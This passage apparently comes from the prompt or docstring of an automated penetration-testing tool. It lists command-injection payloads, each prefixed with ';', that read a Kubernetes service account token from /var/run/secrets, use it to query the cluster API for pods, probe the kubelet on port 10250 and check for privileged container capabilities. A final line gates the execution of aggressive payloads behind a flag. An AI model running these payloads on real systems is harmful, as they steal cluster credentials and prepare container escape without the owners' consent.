;curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
  https://kubernetes.default.svc/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods

# kubelet on host (10250 read-only port deprecated; 10250 still serves /pods)
;curl -k https://NODE_IP:10250/pods

# Privileged container check
;capsh --print 2>/dev/null | grep -i 'cap_sys_admin\\|cap_net_admin\\|cap_dac_'
```

Document the escape vector found WITHOUT executing it unless `RCE_AGGRESSIVE_PAYLOADS`
is True.
"""
